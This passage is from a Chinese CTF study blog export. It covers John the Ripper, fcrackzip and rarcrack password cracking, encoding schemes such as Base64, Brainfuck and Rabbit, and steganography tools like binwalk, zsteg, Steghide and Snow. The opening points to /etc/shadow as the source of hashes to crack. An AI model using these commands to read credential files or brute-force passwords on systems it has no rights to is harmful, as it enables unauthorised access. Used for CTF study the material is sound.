John 破解密码需要先获得__目标系统的哈希文件__。在 Linux 系统中，可以通过 <code>/etc/shadow</code> 文件获取哈希文件</p></li><li><p>准备字典文件<br> 字典文件是用于猜测密码的文本文件，其中包含常见的单词、名字、生日等信息，可以自己制作，也可以网上下载</p></li><li><p>运行 John</p></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>字典文件路径 哈希文件路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>--wordlist</code> 选项指定了要使用的字典文件，哈希文件路径为目标系统的哈希文件路径</p><hr><h1 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h1><blockquote><p>一个用于暴力破解 zip 文件密码的命令行工具</p></blockquote><p>下载安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> fcrackzip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>用法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fcrackzip <span class="token parameter variable">-b</span> <span class="token parameter variable">-c</span> <span class="token string">'aA1!'</span> <span class="token parameter variable">-l</span> <span class="token number">1</span>-10 <span class="token parameter variable">-u</span> zip文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left"><code>-b</code></td><td align="left">代表 暴力破解</td></tr><tr><td align="left"><code>-c</code></td><td align="left">指定使用的字符集</td></tr><tr><td align="left"><code>-l</code></td><td align="left">限制密码长度</td></tr></tbody></table><hr><h1 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h1><blockquote><p>一个用于暴力破解 RAR 文件密码的命令行工具</p></blockquote><p>下载安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> rarcrack<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libxml2-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">rarcrack 文件名 <span class="token parameter variable">--threads</span> 线程数 <span class="token parameter variable">--type</span> rar/zip/7z选其一<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂项中加密和编码方式的特点</title>
      <link href="/posts/e9c97121.html"/>
      <url>/posts/e9c97121.html</url>
      
        <content type="html"><![CDATA[<h1 id="Base-家族"><a href="#Base-家族" class="headerlink" title="Base 家族"></a>Base 家族</h1><blockquote><p><strong>不同的 Base 系列编码主要区别在于：编码所用到的字符数量不同</strong></p></blockquote><hr><h2 id="自动化工具（BaseCrack）"><a href="#自动化工具（BaseCrack）" class="headerlink" title="自动化工具（BaseCrack）"></a>自动化工具（BaseCrack）</h2><blockquote><p>在 <code>BaseCrack</code> 的帮助下，可以自动识别出 Base 系列的加密，并且还可以一次性对任意模式下的多重 Base 编码数据进行解码</p><p>BaseCrack 下载地址：<a href="https://github.com/mufeedvh/basecrack">basecrack</a><br>安装依赖文件：<code>pip3 install -r requirements.txt</code><br>运行：<code>python basecrack.py</code></p></blockquote><hr><h2 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h2><blockquote><p>64 &#x3D; $2 ^ {6}$，每 6bit 为一个单元， 使用 <code>64 个 ASCii 可打印字符</code>（字母 A-Z、字母 a-z、数字 0-9 和 ‘+’、’&#x2F;‘）</p></blockquote><ul><li>码表：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code> （另外，<code>&#39;=&#39;</code> 用作填充）</li><li><strong>经过 Base64 编码后的字符串长度一定会被4整除（长度包括后缀等号）</strong></li><li>由于 8bit 数据按照 6bit 切分不一定整除，末尾可能会出现 1 或 2 个 <code>&#39;=&#39;</code>，但 <code>&#39;=&#39;</code> 不超过两个</li></ul><hr><h2 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a>Base16</h2><blockquote><p>16 &#x3D; $2 ^ {4}$，每 4bit 为一个单元，使用 <code>16 个 ASCii 可打印字符</code>（字母 A-F、数字 0-9）</p></blockquote><ul><li>由于 8bit 数据按照 4bit 切分刚好是 2 组，所以 Base16 不可能用到填充符号 <code>&#39;=&#39;</code></li></ul><hr><h2 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h2><blockquote><p>32 &#x3D; $2 ^ {5}$，每 5bit 为一个单元，使用 <code>32 个 ASCii 可打印字符</code>（字母 A-Z、数字 2-7）</p></blockquote><hr><h2 id="base36"><a href="#base36" class="headerlink" title="base36"></a>base36</h2><blockquote><p>使用 <code>36 个 ASCii 可打印字符</code>（数字 0-9，26 个字母：A-Z 或 a-z）</p></blockquote><ul><li>加密仅支持整数数字，解密仅支持字符串，不支持中文</li></ul><hr><h2 id="Base58"><a href="#Base58" class="headerlink" title="Base58"></a>Base58</h2><blockquote><p>使用 <code>58 个 ASCii 可打印字符</code>（Base64 除去数字 <code>&#39;0&#39;</code>，大写字母 <code>&#39;O&#39;</code>、<code>&#39;I&#39;</code>，小写字母 <code>&#39;l&#39;</code>，和 <code>&#39;+&#39;</code>、 <code>&#39;/&#39;</code>）</p></blockquote><hr><h2 id="Base62"><a href="#Base62" class="headerlink" title="Base62"></a>Base62</h2><blockquote><p>使用 <code>62 个 ASCii 可打印字符</code>（数字 0-9、字母 A-Z 和字母 a-z）</p></blockquote><hr><h2 id="Base91"><a href="#Base91" class="headerlink" title="Base91"></a>Base91</h2><blockquote><p>使用 <code>91 个 ASCii 可打印字符</code>，从 ASCii 字符（0x21 - 0x7E）中除 <code>-</code>（0x2D）、<code>\</code>（0x5C）、<code>&#39;</code>（0x27）外的其他 91 个可打印字符组成</p></blockquote><hr><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><blockquote><p>MD5 值是 <code>32位</code> 由数字 0-9，字母 a-f 组成的字符串（<code>也有可能是 16 位</code>）</p></blockquote><ul><li>MD5 散列结果是 128bit 固定长度的二进制数据，然后将每 4 个二进制数据转化为 1 个十六进制数据，因此，128 位二进制数据转化为 32 个十六进制数据（128 &#x2F; 4 &#x3D; 32），最终以字符串形式呈现</li></ul><hr><h1 id="URL-编码"><a href="#URL-编码" class="headerlink" title="URL 编码"></a>URL 编码</h1><blockquote><p>URL 编码中只允许包含英文字母、数字、4 个特殊字符：<code>- _ . ~</code> 和所有的保留字符：<code>！ * ’ ( ) ; : @ &amp; = + $ , / ? # [ ]</code></p></blockquote><ul><li>URL 编码后的字符串中含有一些特殊的字符，比如 <code>&#39;%&#39;</code>、<code>&#39;+&#39;</code> 等，</li></ul><hr><h1 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h1><blockquote><p>Brainfuck 是一种极简单的编程语言，它只包含 8 个命令字符，并且没有任何高级语言的概念，比如函数、变量等</p></blockquote><table><thead><tr><th align="left">字符</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>&gt;</code></td><td align="left">移动指针到向右一个内存单元</td></tr><tr><td align="left"><code>&lt;</code></td><td align="left">移动指针到向左一个内存单元</td></tr><tr><td align="left"><code>+</code></td><td align="left">将当前内存单元加 1</td></tr><tr><td align="left"><code>-</code></td><td align="left">将当前内存单元减 1</td></tr><tr><td align="left"><code>.</code></td><td align="left">输出当前内存单元的值</td></tr><tr><td align="left"><code>,</code></td><td align="left">从输入读入一个字符，并将其赋值给当前内存单元</td></tr><tr><td align="left"><code>[</code></td><td align="left">如果当前内存单元的值为 0，则跳转到对应的 <code>]</code> 之后</td></tr><tr><td align="left"><code>]</code></td><td align="left">如果当前内存单元的值不为 0，则跳转到对应的 <code>[</code> 之前</td></tr></tbody></table><ul><li>用 <code>&#39;&gt;&#39;</code>、<code>&#39;&lt;&#39;</code>、<code>&#39;+&#39;</code>、<code>&#39;-&#39;</code>、<code>&#39;.&#39;</code>、<code>&#39;,&#39;</code>、<code>&#39;[&#39;</code>、<code>&#39;]&#39;</code> 八种符号组成</li><li>例如：<br>  明文 Hello World!，加密后密文为：<code>++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;.</code></li></ul><hr><h1 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h1><blockquote><p>Ook! 是 Brainfuck 的一种变体，它同样只包含 8 个命令字符，但是两两成对，每对命令字符组成一个 “Ook” 单元</p></blockquote><table><thead><tr><th align="left">符号</th><th align="left">含义</th></tr></thead><tbody><tr><td align="left"><code>Ook? Ook.</code></td><td align="left">移动指针到向右一个内存单元</td></tr><tr><td align="left"><code>Ook. Ook?</code></td><td align="left">移动指针到向左一个内存单元</td></tr><tr><td align="left"><code>Ook. Ook.</code></td><td align="left">将当前内存单元加 1</td></tr><tr><td align="left"><code>Ook! Ook!</code></td><td align="left">将当前内存单元减 1</td></tr><tr><td align="left"><code>Ook! Ook.</code></td><td align="left">输出当前内存单元的值</td></tr><tr><td align="left"><code>Ook. Ook!</code></td><td align="left">从输入读入一个字符，并将其赋值给当前内存单元</td></tr><tr><td align="left"><code>Ook! Ook?</code></td><td align="left">如果当前内存单元的值为 0，则跳转到对应的 <code>Ook? Ook!</code> 之后</td></tr><tr><td align="left"><code>Ook? Ook!</code></td><td align="left">如果当前内存单元的值不为 0，则跳转到对应的 <code>Ook! Ook?</code> 之前</td></tr></tbody></table><ul><li>Ook! 和 Brainfuck 的主要区别在于其命令字符是成对出现的，以及 Ook! 的输出是单个字符，而不是 ASCii 码</li><li>特点是字符串中存在很多 <code>&#39;.&#39;</code>、<code>&#39;!&#39;</code>、<code>&#39;?&#39;</code> 符号</li></ul><hr><h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><blockquote><p>凯撒密码一般适用于 26 个英文字母，根据对字符串中的字符进行移位来实现加密</p><p>例如，当偏移量为 3 时，A 被替换成 D，B 被替换成 E，Z 被替换成 C</p></blockquote><hr><h1 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h1><blockquote><p>Rabbit 加密开头部分通常为：<code>U2FsdGVkX1</code></p></blockquote><ul><li>明显密文里​​ <code>&#39;+&#39;</code> 比较多，并且经常有 <code>&#39;/&#39;</code></li><li>例如：<br>  明文 “I Love You 521”，无密钥，加密后密文为：__U2FsdGVkX1__9DvuEo5PvBA8TuLrM2t+EZBvUkzlAa<br>  明文 “I Love You 521”，密钥为 666，加密后密文为：__U2FsdGVkX1__8w6vxXxux&#x2F;ivRVwo3xMzTxmUyk7cHz</li></ul><hr><h1 id="兽语编码"><a href="#兽语编码" class="headerlink" title="兽语编码"></a>兽语编码</h1><blockquote><p>用动物的拟声词或语气词作为加密内容</p></blockquote><ul><li>例如：<br>  明文 “我喜欢你”，加密后密文为：<del>呜嗷呜啊嗷</del>嗷<del>呜嗷啊呜啊啊<del>嗷</del>啊呜嗷</del>嗷<del>呜嗷嗷</del>嗷呜嗷~~啊</li></ul><hr><h1 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h1><blockquote><p>摩斯密码使用点 <code>&#39;.&#39;</code> 和划线 <code>&#39;-&#39;</code> 两种符号表示摩斯电码中的点和线</p></blockquote><ul><li>有时会出现在杂项的音频隐写中，一般在波谱中，用较宽的代表 <code>&#39;-&#39;</code>，用较窄的代表 <code>&#39;.&#39;</code>，而中间的间隔代表 <code>&#39;/&#39;</code></li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%90%84%E7%A7%8D%E5%8A%A0%E5%AF%86%E6%96%B9%E6%B3%95%E7%9A%84%E7%89%B9%E7%82%B9_%E6%91%A9%E6%96%AF%E5%AF%86%E7%A0%811.png" alt="各种加密方法的特点_摩斯密码1.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Misc </tag>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐写术</title>
      <link href="/posts/af814b4b.html"/>
      <url>/posts/af814b4b.html</url>
      
        <content type="html"><![CDATA[<h1 id="图像隐写"><a href="#图像隐写" class="headerlink" title="图像隐写"></a>图像隐写</h1><h2 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h2><blockquote><p>分析文件里面包含的隐藏文件</p></blockquote><p>安装 binwalk：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> binwalk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>通过扫描发现目标文件中包含的所有可识别的文件类型</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>自动提取出已知的文件类型</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">binwalk <span class="token parameter variable">-e</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h2><blockquote><p>检测 <code>png</code> 和 <code>bmp</code> 图片里的隐写数据</p><p>Linux 下安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gem <span class="token function">install</span> zsteg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><ol><li>查看 LSB 分析结果</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsteg 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>快速提取所有隐藏信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsteg 文件名 <span class="token parameter variable">--all</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li>从某个文件的偏移地址处提取出隐藏文件</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">zsteg <span class="token parameter variable">-e</span> <span class="token string">"偏移地址"</span> 源文件名 <span class="token operator">></span> 提取文件的文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="foremost"><a href="#foremost" class="headerlink" title="foremost"></a>foremost</h2><blockquote><p>将隐藏在文件中的其他文件分离出来</p></blockquote><ol><li>将文件分离并存放到 <code>output</code> 文件夹下</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">foremost 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>如果已经知道文件中包含了一个其他的文件类型，通过 <code>binwalk</code> 得到偏移地址，<mark>可以直接在 <code>WinHex</code> 中定位到该偏移地址，然后将文件的内容直接复制到一个新建的文件中，即可得到包含的文件</mark></p></blockquote><hr><h2 id="strings"><a href="#strings" class="headerlink" title="strings"></a>strings</h2><blockquote><p>打印文件中可打印字符串</p></blockquote><ol><li>将文件中包含的可打印字符串输出出来（有点类似于 IDA 里的 shift + F12 查看字符串）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>仅输出文件中包含 <code>&quot;flag&quot;</code> 的字符串</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">strings 文件名 <span class="token operator">|</span> <span class="token function">grep</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="Stegsolve"><a href="#Stegsolve" class="headerlink" title="Stegsolve"></a>Stegsolve</h2><blockquote><p>轻量级的图片隐写工具（Stegsolve 是一个 jar 包，首先需安装好 java 环境）</p><ul><li>下载地址：<a href="http://www.caesum.com/handbook/Stegsolve.jar">Stegsolve.jar（win&#x2F;linux）</a></li><li>安装 <a href="https://www.oracle.com/java/technologies/downloads/#java8-windows">java jdk</a> 环境，用 <code>java -version</code> 验证安装是否成功</li></ul></blockquote><ol><li>运行 Stegsolve</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> Stegsolve.jar所在路径<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="pngcheck"><a href="#pngcheck" class="headerlink" title="pngcheck"></a>pngcheck</h2><blockquote><p>用于测试 <code>png</code> 图像文件的损坏、显示大小、类型、压缩信息</p><p>Linux 下安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> pngcheck<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Windows 版：<a href="http://www.libpng.org/pub/png/apps/pngcheck.html">pngcheck Home Page</a></p></blockquote><ol><li>使用 pngcheck 测试 png 图片</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pngcheck png文件名   <span class="token comment"># 如果图片被修改了宽高，会显示："CRC error in chunk IHDR"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><strong>其实被修改过的 png 图片在 Linux 下是无法打开查看的</strong></p><p>因为 CRC 校验错误，双击会显示：读入PNG图像文件时发生严重错误：<code>&quot;IHDR：CRCerror&quot;</code></p></blockquote><p>png 文件头结构如下图：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E9%9A%90%E5%86%991.png" alt="隐写1.png"></p><ol start="2"><li>检测是否存在 IDAT 隐写</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pngcheck <span class="token parameter variable">-v</span> png文件名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>假设输出如下：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">  chunk IHDR at offset 0x0000c, length 13    547 x 962 image, 32-bit RGB+alpha, non-interlaced  chunk sRGB at offset 0x00025, length 1    rendering intent = perceptual  chunk gAMA at offset 0x00032, length 4: 0.45455  chunk pHYs at offset 0x00042, length 9: 5669x5669 pixels/meter (144 dpi)  chunk IDAT at offset 0x00057, length 65445    zlib: deflated, 32K window, fast compression  chunk IDAT at offset 0x10008, length 65524  chunk IDAT at offset 0x20008, length 65524  chunk IDAT at offset 0x30008, length 65524  chunk IDAT at offset 0x40008, length 65524  chunk IDAT at offset 0x50008, length 65524  chunk IDAT at offset 0x60008, length 65524  chunk IDAT at offset 0x70008, length 65524  chunk IDAT at offset 0x80008, length 65524  chunk IDAT at offset 0x90008, length 45027  chunk IDAT at offset 0xa0008, length 138  chunk IEND at offset 0xa2e55, length 0No errors detected in xxx (16 chunks, 68.3% compression).<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><strong>IDAT有固定的长度</strong>，正常的 <strong>PNG 图片</strong>只有最后一个 IDAT 块的长度是比其他的要短的，如果在中间的位置出现了与前面不同的长度，说明存在 IDAT 隐写</p></blockquote><p>因此异常数据位于 <code>0xa0008</code> 处，共 138 字节，提取该位置的 IDAT 数据</p><p>使用 <code>zlib</code> 进行压缩：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zlib<span class="token keyword">import</span> binasciiIDAT <span class="token operator">=</span> <span class="token string">"789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667"</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>result <span class="token operator">=</span> binascii<span class="token punctuation">.</span>hexlify<span class="token punctuation">(</span>zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>IDAT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Steghide"><a href="#Steghide" class="headerlink" title="Steghide"></a>Steghide</h2><blockquote><p>一个可以将文件隐藏到图片或音频中的工具，也可以将文件从图片中分离</p><p>Linux 下安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> steghide<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><ol><li>查看图片中嵌入的文件信息</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide info 图片<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>提取图片中的隐藏内容</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide extract <span class="token parameter variable">-sf</span> 图片 <span class="token parameter variable">-p</span> 密码<span class="token punctuation">(</span>如果有<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果没有密码，输入：<code>steghide extract -sf 图片</code> 后直接回车即可</p><ol start="3"><li>将文件隐藏到图片中</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">steghide embed <span class="token parameter variable">-cf</span> 图片 <span class="token parameter variable">-ef</span> 需要隐藏的文件 <span class="token parameter variable">-p</span> 密码<span class="token punctuation">(</span>如果有<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h2><blockquote><p>盲水印是一种肉眼不可见的水印方式，不影响原图，还可以作为版权保护</p><p><strong>CTF 赛题中如果给了两张看起来一模一样的图片，可以考虑盲水印的可能性</strong></p></blockquote><ul><li>Python 盲水印工具</li></ul><blockquote><p>Python 2.7 版本：<a href="https://github.com/linyacool/blind-watermark">linyacool&#x2F;blind-watermark: Watermark added to the frequency domain by Fourier transform</a></p><p>Python 3 版本：<a href="https://github.com/linyacool/blind-watermark/tree/python3">linyacool&#x2F;blind-watermark at python3</a></p></blockquote><p>使用前需要安装 cv2 模块：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pip <span class="token function">install</span> opencv-contrib-python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li>合成盲水印图</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python encode.py <span class="token parameter variable">--image</span> 无水印原图 <span class="token parameter variable">--watermark</span> 水印图 <span class="token parameter variable">--result</span> 加上盲水印后的原图<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>提取图中的盲水印（<strong>需要原图</strong>）</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python decode.py <span class="token parameter variable">--original</span> 无水印原图 <span class="token parameter variable">--image</span> 加上盲水印后的原图 <span class="token parameter variable">--result</span> 提取出的水印图<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h1><h2 id="Audacity"><a href="#Audacity" class="headerlink" title="Audacity"></a>Audacity</h2><blockquote><p>Audacity 是一款音频编辑软件，可以查看音频的频率、波谱等，有时候会隐藏信息</p><p>音频分析软件 Audacity 下载地址：<a href="https://www.audacityteam.org/">Audacity ® | Free</a></p></blockquote><hr><h2 id="DeepSound"><a href="#DeepSound" class="headerlink" title="DeepSound"></a>DeepSound</h2><blockquote><p>DeepSound 是一种隐写术工具，可以将隐藏的消息或文件嵌入到音频中</p><p>音频隐写软件 DeepSound 下载地址：<a href="http://www.jpinsoft.net/deepsound/download.aspx">DeepSound -&gt; Download</a></p></blockquote><hr><h1 id="其他隐写"><a href="#其他隐写" class="headerlink" title="其他隐写"></a>其他隐写</h1><h2 id="Snow-隐写"><a href="#Snow-隐写" class="headerlink" title="Snow 隐写"></a>Snow 隐写</h2><blockquote><p>“Snow 隐写就像在雪地上看到的脚印，虽然人们可能不会注意到脚印，但它们仍然存在，并且可以被检测到”</p><p>Snow 隐写是在 HTML 嵌入隐写信息，通过在行尾附加空格或制表符来隐藏 ASCii 文本中的信息，不同的空格与制表位的组合代表不同的嵌入信息</p><p>工具下载链接：<a href="https://darkside.com.au/snow/index.html">Snow 隐写工具下载</a></p><p><strong>可以通过 Ctrl + A 全选来查看是否含有大量空白不可见字符，从而判断是否为 Snow 隐写</strong></p></blockquote><table><thead><tr><th align="left">参数</th><th align="left">含义</th><th></th></tr></thead><tbody><tr><td align="left"><code>-C</code></td><td align="left">如果隐藏，则压缩数据，或者如果提取，则会解压缩</td><td></td></tr><tr><td align="left"><code>-Q</code></td><td align="left">静音模式。如果未设置，则程序报告统计信息，例如压缩百分比和可用存储空间的数量</td><td></td></tr><tr><td align="left"><code>-S</code></td><td align="left">报告文本文件中隐藏消息的近似空间量。考虑线长度，但忽略其他选项</td><td></td></tr><tr><td align="left"><code>-p</code> 密码</td><td align="left">如果设置为此，则在隐藏期间将使用此密码加密数据，或在提取期间解密</td><td></td></tr><tr><td align="left"><code>-l</code> 长度</td><td align="left">在附加空格时，Snow 将始终产生比此值短的线条。默认情况下为 80</td><td></td></tr><tr><td align="left"><code>-f</code> 文件</td><td align="left">此文件的内容将隐藏在输入文本文件中</td><td></td></tr><tr><td align="left"><code>-m</code> 字符串</td><td align="left">此字符串的内容将被隐藏在输入文本文件中。请注意，除非在字符串中包含一个换行符，否则在提取时不会打印换行符</td><td></td></tr></tbody></table><ol><li>常用解密命令：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SNOW.EXE <span class="token parameter variable">-C</span> <span class="token parameter variable">-p</span> 密码 Snow隐写文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>示例：</li></ol><p>将消息 <code>&quot;I am lying&quot;</code> 隐藏在输入文件 <code>infile</code> 中，使用密码 <code>&quot;hello world&quot;</code> 进行加密，并将结果保存在名为 <code>outfile</code> 的文件中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SNOW.EXE <span class="token parameter variable">-C</span> <span class="token parameter variable">-m</span> <span class="token string">"I am lying"</span> <span class="token parameter variable">-p</span> <span class="token string">"hello world"</span> infile outfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>则对应的解密命令为：（生成的消息不会被换行符终止）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">SNOW.EXE <span class="token parameter variable">-C</span> <span class="token parameter variable">-p</span> <span class="token string">"hello world"</span> outfile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="零宽度字符隐写"><a href="#零宽度字符隐写" class="headerlink" title="零宽度字符隐写"></a>零宽度字符隐写</h2><blockquote><p>零宽度字符是一些不可见的、不可打印的字符，主要用于调整字符的显示格式</p><p>这种隐写方式是基于零宽度字符在一般的文本编辑器中是不可见的，主要包括：</p><ol><li>零宽度空格（<code>\u200b</code>）</li><li>零宽度非连接符（<code>\u200c</code>）</li><li>零宽度连接符（<code>\u200d</code>）</li><li>从左至右书写标记（<code>\u200e</code>）</li><li>从右至左书写标记（<code>\u200f</code>）</li><li>零宽度非断空格符（<code>\ufeff</code>）</li></ol></blockquote><p>例如下面这段文本：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">​​​​​​​​​​​​​​​​Lorem ipsum​​​​​​​ dolor ‌‌‌‌‍﻿‍‍sit​​​​​​​​ amet​​​​​​​​​‌‌‌‌‍﻿‍‌, consectetur ​​​​​​​adipiscing​​​​​​​‌‌‌‌‍‬‍‬ elit​​​​​​​.‌‌‌‌‍‬﻿‌​​​​​​​‌‌‌‌‍‬‌‍ Phasellus quis​​​​​​​ tempus​​​​​​ ante, ​​​​​​​​nec vehicula​​​​​​​​​​​​​​​​ mi​​​​​​​​. ​​​​​​​‌‌‌‌‍‬‍﻿Aliquam nec​​​​​​​​​‌‌‌‌‍﻿‬﻿ nisi ut neque​​​​​​​ interdum auctor​​​​​​​.‌‌‌‌‍﻿‍﻿ Aliquam felis ‌‌‌‌‍‬‬‌orci​​​​​​​, vestibulum ‌‌‌‌‍﻿‬‍sit ​​​​​​​amet​​​​​​​​​ ante‌‌‌‌‍‌﻿‬ at​​​​​​​, consectetur‌‌‌‌‍‌﻿﻿ lobortis eros​​​​​​​​​.‌‌‌‌‍‍‍‌ ‌‌‌‌‍‌‌‌​​​​​​​Orci varius​​​​​​​ ​​​​​​​natoque ‌‌‌‌‍﻿‌﻿penatibus et 